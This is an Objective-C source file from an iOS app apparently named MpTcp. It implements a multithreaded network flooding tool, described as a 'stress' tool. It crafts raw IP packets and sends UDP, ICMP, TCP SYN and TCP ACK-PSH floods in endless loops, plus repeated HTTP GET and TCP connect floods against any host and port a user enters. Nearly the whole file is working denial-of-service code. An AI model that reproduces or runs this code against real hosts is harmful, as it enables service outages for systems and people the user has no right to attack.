//
//  Web.m
//  Mptcptmp
//
//  Created by Felipe Ecker on 10/07/13.
//  Copyright (c) 2013 Felipe Ecker. All rights reserved.
//

#import "Web.h"

static struct __data _data;   /* Sender bulk */
@implementation Web

- (id) init {
    self = [super init];
    
    if (self) self.threads = [NSMutableArray arrayWithCapacity:50];
    return self;
}


- (void) ReturnKeyboard {
    [self.target resignFirstResponder];
    [self.port resignFirstResponder];
}


- (void)editChanged {
    
    if ( (self.target.text.length > 0) && (self.port.text.length > 0) ) {
        if (self.http.on ||
            self.tcpconn.on ||
            self.tcpsyn.on ||
            self.tcpack.on ||
            self.icmp.on ||
            self.udp.on
        )
            self.start.enabled = YES;
    } else {
        self.start.enabled = NO;
    }
    
    return;
}


- (void) changeThreads {
    NSString *str = [[NSString alloc] initWithFormat:@"%.0f", self.threadsSlider.value];
    self.threadsLabel.text = str;
}


- (void) changeStates {
    if (self.http.on) {
        self.tcpconn.enabled = NO;
        self.tcpsyn.enabled = NO;
        self.tcpack.enabled = NO;
        self.icmp.enabled = NO;
        self.udp.enabled = NO;
    
        if ( (self.target.text.length > 0) && (self.port.text.length > 0) ) self.start.enabled = YES;
        return;
    }
    
    if (self.tcpconn.on) {
        self.http.enabled = NO;
        self.tcpsyn.enabled = NO;
        self.tcpack.enabled = NO;
        self.icmp.enabled = NO;
        self.udp.enabled = NO;
        
        if ( (self.target.text.length > 0) && (self.port.text.length > 0) ) self.start.enabled = YES;
        return;
    }
    
    if (self.tcpsyn.on) {
        self.http.enabled = NO;
        self.tcpconn.enabled = NO;
        self.tcpack.enabled = NO;
        self.icmp.enabled = NO;
        self.udp.enabled = NO;
        
        if ( (self.target.text.length > 0) && (self.port.text.length > 0) ) self.start.enabled = YES;
        return;
    }
    
    if (self.tcpack.on) {
        self.http.enabled = NO;
        self.tcpsyn.enabled = NO;
        self.tcpconn.enabled = NO;
        self.icmp.enabled = NO;
        self.udp.enabled = NO;
        
        if ( (self.target.text.length > 0) && (self.port.text.length > 0) ) self.start.enabled = YES;
        return;
    }
    
    if (self.icmp.on) {
        self.port.enabled = NO;
        [self.port setAlpha:.6];
        self.http.enabled = NO;
        self.tcpsyn.enabled = NO;
        self.tcpack.enabled = NO;
        self.tcpconn.enabled = NO;
        self.udp.enabled = NO;
        
        if ( (self.target.text.length > 0) && (self.port.text.length > 0) ) self.start.enabled = YES;
        return;
    }
    
    if (self.udp.on) {
        self.http.enabled = NO;
        self.tcpsyn.enabled = NO;
        self.tcpack.enabled = NO;
        self.tcpconn.enabled = NO;
        self.icmp.enabled = NO;
        
        if ( (self.target.text.length > 0) && (self.port.text.length > 0) ) self.start.enabled = YES;
        return;
    }
    
    self.http.enabled = YES;
    self.tcpconn.enabled = YES;
    self.tcpsyn.enabled = YES;
    self.tcpack.enabled = YES;
    self.icmp.enabled = YES;
    self.udp.enabled = YES;
    self.port.enabled = YES;
    [self.port setAlpha:1];
    
    self.start.enabled = NO;
    return;
}


- (void) __print:(NSString *) msg {
    [Console roll:msg forInit:false toTittle:false inDump:false];
}


- (void) __check_return {
    if (!ret.success) {
        UIAlertView *alert = [[UIAlertView alloc]
                              initWithTitle:@"Error"
                              message:[NSString stringWithFormat:@"%s", ret.errmsg]
                              delegate:self
                              cancelButtonTitle:@"OK"
                              otherButtonTitles:nil];
        [alert show];
    }
    
    ret.success = true;
    return;
}


- (void) __packing:(uchar *) buffer
                    atSource:(struct sockaddr_in *) source
                    atTarget:(struct sockaddr_in *) target
                    onType:(const uint32) __type {
    
    struct tcphdr *__tcp   = (struct tcphdr *) (buffer + SIZE_IP);
    struct udphdr *__udp   = (struct udphdr *) (buffer + SIZE_IP);
    
    struct __auxhdr {
        uint32 saddr;
        uint32 daddr;
        uint8 useless;
        uint8 proto;
        uint16 tcpsiz;
        struct tcphdr tcp;
        uchar data[52 - (SIZE_IP + SIZE_TCP)];
    } __packed__ tcpaux;
    
    struct __auxhdr2 {
        uint32 saddr;
        uint32 daddr;
        uint8 useless;
        uint8 proto;
        uint16 udpsiz;
        struct udphdr udp;
        uchar data[52 - (SIZE_IP + SIZE_UDP)];
        
    } __packed__ udpaux;
    
    struct ip *__ip      = (struct ip *) buffer;
    struct icmp *__icmp  = (struct icmp *) (buffer + SIZE_IP);
    
    __ip->ip_src   = source->sin_addr;
    __ip->ip_dst   = target->sin_addr;
    __ip->ip_v     = 0x04;
    __ip->ip_off   = 0x00;
    __ip->ip_hl    = 0x05;
    __ip->ip_ttl   = rand() % 0xFF;
    __ip->ip_id    = htons(rand() % 0xFFFF);
    __ip->ip_len   = 52;
    __ip->ip_sum   = __checksum((uint16 *) __ip, SIZE_IP);
    
    switch(__type) {
        case WEB_UDP:
            __ip->ip_p        = IPPROTO_UDP;
            
            __udp->uh_sport   = source->sin_port;
            __udp->uh_dport   = target->sin_port;
            __udp->uh_ulen    = htons(52 - SIZE_IP);
            __udp->uh_sum     = 0x00;
            
            memset(&udpaux, 0, sizeof(struct __auxhdr2));
            udpaux.saddr      = __ip->ip_src.s_addr;
            udpaux.daddr      = __ip->ip_dst.s_addr;
            udpaux.useless    = 0x0;
            udpaux.proto      = IPPROTO_UDP;
            udpaux.udpsiz     = htons(52 - SIZE_IP);
            
            memcpy(&udpaux.udp, __udp, SIZE_UDP);
            __udp->uh_sum     = __checksum( (uint16 *) &udpaux, (52 - SIZE_IP));
            break;
            
        case WEB_ICMP:
            __ip->ip_p        = IPPROTO_ICMP;
            
            __icmp->icmp_type = 0x08;
            __icmp->icmp_code = 0x00;
            __icmp->icmp_id   = htons(rand() % 0xFFFF);
            __icmp->icmp_seq  = htons(rand() % 0xFFFF);
            __icmp->icmp_cksum= __checksum( (uint16 *) __icmp, SIZE_ICMP);
            break;
            
        case WEB_TCP:
            __ip->ip_p        = IPPROTO_TCP;
            
            __tcp->th_sport   = source->sin_port;
            __tcp->th_dport   = target->sin_port;
            __tcp->th_seq     = htonl(rand() % 0xFFFFFFFF);
            __tcp->th_ack     = (pkt->tcpType & TCP_ACK) ? htonl(rand() % 0xFFFFFFFF) : 0x00000000;
            __tcp->th_x2      = 0x0;
            __tcp->th_off     = 0x5;
            __tcp->th_flags  |= (pkt->tcpType & TCP_SYN) ? TCP_SYN : 0x00;
            __tcp->th_flags  |= (pkt->tcpType & TCP_ACK) ? TCP_ACK : 0x00;
            __tcp->th_flags  |= (pkt->tcpType & TCP_PSH) ? TCP_PSH : 0x00;
            __tcp->th_win     = htons(1024);
            /* I'll set size window to 1024. Don't care about is. */
            __tcp->th_urp     = 0x00;
            __tcp->th_sum     = 0x00;
            
            memset(&tcpaux, 0, sizeof(struct __auxhdr));
            tcpaux.saddr      = __ip->ip_src.s_addr;
            tcpaux.daddr      = __ip->ip_dst.s_addr;
            tcpaux.useless    = 0x0;
            tcpaux.proto      = IPPROTO_TCP;
            tcpaux.tcpsiz     = htons(52 - SIZE_TCP);
            
            memcpy(&(tcpaux.tcp), __tcp, SIZE_TCP);
            __tcp->th_sum   = __checksum( (uint16 *) &tcpaux, (52 - SIZE_IP));
            break;
            
        default: pass;
    }
}



- (void) __udpstress:(NSNumber *) index {
    
    register uint32 sock;
    /* RAW socket*/
    if ( !( sock = __socketPool(true, 0, false)) ) return;
    __set_hdrincl(sock);
    
    uchar cbuffer[52];
    memset(cbuffer, 0, sizeof(cbuffer));
    
    [Console roll:[NSString stringWithFormat:@"[WEB STRESS] Sending UDP packets to [%@]:%@", self.target.text, self.port.text] forInit:false toTittle:true inDump:true];
    [CATransaction flush];
    
    register uint8 tsize = sizeof(struct sockaddr_in);
    register uint8 size = sizeof(cbuffer);
    register uchar *buffer = cbuffer;
    register struct sockaddr_in *targ = _data.target;
    
    do {
        [self __packing:cbuffer atSource:_data.source atTarget:_data.target onType:WEB_UDP];
        sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
    } while(!self.stop);
        
    return;
}


- (void) __icmpstress:(NSNumber *) index {
            
    register signed int sock;
    /* ICMP RAW socket*/
    if ( !( sock = __socketPool(false, __ICMP_MODE__, false)) ) return;
    
    __set_broadcast(sock);
    __set_hdrincl(sock);
    
    uchar cbuffer[52];
    memset(cbuffer, 0, sizeof(cbuffer));
    
    [Console roll:[NSString stringWithFormat:@"[WEB STRESS] Sending ICMP packets to [%@]", self.target.text] forInit:false toTittle:true inDump:true];
    [CATransaction flush];
    
    [self __packing:cbuffer atSource:_data.source atTarget:_data.target onType:WEB_ICMP];
    
    register uint8 tsize = sizeof(struct sockaddr_in);
    register uint8 size = sizeof(cbuffer);
    register uchar *buffer = cbuffer;
    register struct sockaddr_in *targ = _data.target;
    
    do {
        sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
    } while(!self.stop);
    
    return;
}


- (void) __tcpsynstress:(NSNumber *) index {

    register uint32 sock;
    /* RAW socket*/
    if ( !( sock = __socketPool(true, 0, false)) ) return;    
    __set_hdrincl(sock);
    
    uchar cbuffer[52];
    memset(cbuffer, 0, sizeof(cbuffer));
    
    [Console roll:[NSString stringWithFormat:@"[WEB STRESS] Sending TCP SYN packets to [%@]:%@", self.target.text, self.port.text] forInit:false toTittle:true inDump:true];
    [CATransaction flush];
    
    register uint8 tsize = sizeof(struct sockaddr_in);
    register uint8 size = sizeof(cbuffer);
    register uchar *buffer = cbuffer;
    register struct sockaddr_in *targ = _data.target;
    
    do {
        [self __packing:cbuffer atSource:_data.source atTarget:_data.target onType:WEB_TCP];
        sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
    } while(!self.stop);
    
    return;
}


- (void) __tcpackstress:(NSNumber *) index {
    
    register uint32 sock;
    /* RAW socket*/
    if ( !( sock = __socketPool(true, 0, false)) ) return;
    __set_hdrincl(sock);
    
    uchar cbuffer[52];
    memset(cbuffer, 0, sizeof(cbuffer));
    
    [Console roll:[NSString stringWithFormat:@"[WEB STRESS] Sending TCP ACK-PSH packets to [%@]:%@", self.target.text, self.port.text] forInit:false toTittle:true inDump:true];
    [CATransaction flush];
    
    register uint8 tsize = sizeof(struct sockaddr_in);
    register uint8 size = sizeof(cbuffer);
    register uchar *buffer = cbuffer;
    register struct sockaddr_in *targ = _data.target;
    
    do {
        [self __packing:cbuffer atSource:_data.source atTarget:_data.target onType:WEB_TCP];
        sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
    } while(!self.stop);
    
    return;
}


- (void) __httpstress:(NSNumber *) index {
    
    register uint32 sock;
    /* RAW socket*/
    if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) return;
    __set_nonblock(sock);
    
    register uint8 tsize = sizeof(struct sockaddr);
    register struct sockaddr_in *targ = _data.target;
    
    auto char __http[1024];
    memset(__http, 0, sizeof(__http));
    snprintf(__http, sizeof(__http) - 1, "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", [self.target.text UTF8String]);
    
    [Console roll:[NSString stringWithFormat:@"Connecting to host [%@] on port %@...", self.target.text, self.port.text] forInit:false toTittle:true inDump:true];
    [CATransaction flush];
    connect(sock, (struct sockaddr *) targ, tsize);
    
    auto struct timeval _times;
    auto fd_set beep, wr;
    _times.tv_sec = 5;
    _times.tv_usec = 0;
    FD_ZERO(&beep);
    FD_ZERO(&wr);
    FD_SET(sock, &beep);
    FD_SET(sock, &wr);
    
    if ( select(sock+1, &beep, &wr, NULL, &_times) != 1) {
        snprintf(ret.errmsg, 511, "Unable to connect on host.");
        ret.success = false;
        return;
    }
    
    close(sock);
    signal(SIGPIPE, SIG_IGN);
    register char *data = __http;
    register uint16 size = strlen(__http);
    
    [self __print:@"[Connected]"];
    [Console roll:[NSString stringWithFormat:@"[WEB STRESS] Making HTTP Requests to [%@]:%@", self.target.text, self.port.text] forInit:false toTittle:true inDump:true];
    [CATransaction flush];
    [self __print:@""];
    
    do {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        __set_nodelay(sock);
        connect(sock, (struct sockaddr *) targ, tsize);
        send(sock, data, size, 0);
        [NSThread sleepForTimeInterval:0.04];
        close(sock);
    } while(!self.stop);
}


- (void) __tcpconnstress:(NSNumber *) index {
    
    register uint32 sock;
    /* RAW socket*/
    if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) return;
    __set_nonblock(sock);
    
    register uint8 tsize = sizeof(struct sockaddr);
    register struct sockaddr_in *targ = _data.target;
    
    [Console roll:[NSString stringWithFormat:@"Connecting to host [%@] on port %@...", self.target.text, self.port.text] forInit:false toTittle:true inDump:true];
    [CATransaction flush];
    connect(sock, (struct sockaddr *) targ, tsize);
    
    auto struct timeval _times;
    auto fd_set beep, wr;
    _times.tv_sec = 5;
    _times.tv_usec = 0;
    FD_ZERO(&beep);
    FD_ZERO(&wr);
    FD_SET(sock, &beep);
    FD_SET(sock, &wr);
    
    if ( select(sock+1, &beep, &wr, NULL, &_times) != 1) {
        snprintf(ret.errmsg, 511, "Unable to connect on host.");
        ret.success = false;
        return;
    }
    
    close(sock);
    uchar cbuffer[40];
    memset(cbuffer, 0x58, sizeof(cbuffer));
    signal(SIGPIPE, SIG_IGN);
    
    register uchar *data = cbuffer;
    register uint32 size = sizeof(cbuffer);
    
    [self __print:@"[Connected]"];
    [Console roll:[NSString stringWithFormat:@"[WEB STRESS] Making HTTP Requests to [%@]:%@", self.target.text, self.port.text] forInit:false toTittle:true inDump:true];
    [CATransaction flush];
    [self __print:@""];
    
    do {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        __set_nodelay(sock);
        connect(sock, (struct sockaddr *) targ, tsize);
        send(sock, data, size, 0);
        [NSThread sleepForTimeInterval:0.04];
        close(sock);
    } while(!self.stop);
}



-(void) run {
    self.check = [NSTimer scheduledTimerWithTimeInterval:3.0 target:self selector:@selector(__check_return) userInfo:nil repeats:YES];
    
    memset(pkt, 0, sizeof(struct __input__));
    
    pkt->tcpType = 0x00;
    ret.success = true;
    self.stop = NO;
    [self.threads removeAllObjects];
    
    const char *month = __getmonth("__today__");
    [Console __roll:[NSString stringWithFormat:@"               Starting MpTcp %s at [%02d.%s.%02d %02d:%02d:%02d]", VERSION, _t->tm_mday, month, _t->tm_year+1900, _t->tm_hour, _t->tm_min, _t->tm_sec] forInit:true toTittle:true inDump:false];
    [Console __roll:@"                       Mptcp Project <www.hexcodes.org>" forInit:false toTittle:true inDump:false];
    [self __print:@""];
    
    if (!self.icmp.on) {
        if ((self.port.text.length > 5) ||
            ((self.port.text.length > 0) && ([self.port.text intValue] < 1)) ||
            ((self.port.text.length > 0) && ([self.port.text intValue] > 65535))
    
            ) {
            snprintf(ret.errmsg, 511, "Invalid port number.");
            ret.success = false;
            return;
        }
    }
    
    _data.source = (struct sockaddr_in *) addressbuff;
    _data.target = (struct sockaddr_in *) (addressbuff + sizeof(struct sockaddr_in));
    
    if (!__lookup(_data.source, nil, 0, true)) return;
    if (!__lookup(_data.target, (char *)[self.target.text UTF8String], (self.icmp.on ? 0 : [self.port.text intValue]), false)) return;
    
    //Pool of threads...
    for (uint index = 0; index < [self.threadsLabel.text intValue]; index++ ) {
        if (self.udp.on) {
            NSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(__udpstress:) object:[NSNumber numberWithUnsignedInt:index]];
            [self.threads insertObject:thread atIndex:index];
            [thread start];
        } else if (self.icmp.on) {
            NSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(__icmpstress:) object:[NSNumber numberWithUnsignedInt:index]];
            [self.threads insertObject:thread atIndex:index];
            [thread start];
        } else if (self.tcpack.on) {
            pkt->tcpType |= TCP_ACK;
            pkt->tcpType |= TCP_PSH;
            NSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(__tcpackstress:) object:[NSNumber numberWithUnsignedInt:index]];
            [self.threads insertObject:thread atIndex:index];
            [thread start];
        } else if (self.tcpsyn.on) {
            pkt->tcpType |= TCP_SYN;
            NSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(__tcpsynstress:) object:[NSNumber numberWithUnsignedInt:index]];
            [self.threads insertObject:thread atIndex:index];
            [thread start];
        } else if (self.http.on) {
            NSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(__httpstress:) object:[NSNumber numberWithUnsignedInt:index]];
            [self.threads insertObject:thread atIndex:index];
            [thread start];
        } else if (self.tcpconn.on) {
            NSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(__tcpconnstress:) object:[NSNumber numberWithUnsignedInt:index]];
            [self.threads insertObject:thread atIndex:index];
            [thread start];
        }
    }
    
    return;
}


- (void) doStop {
    [self.check invalidate];
    self.check = nil;
    self.stop = YES;
    if (__session) pcap_breakloop(__session);
}

@end
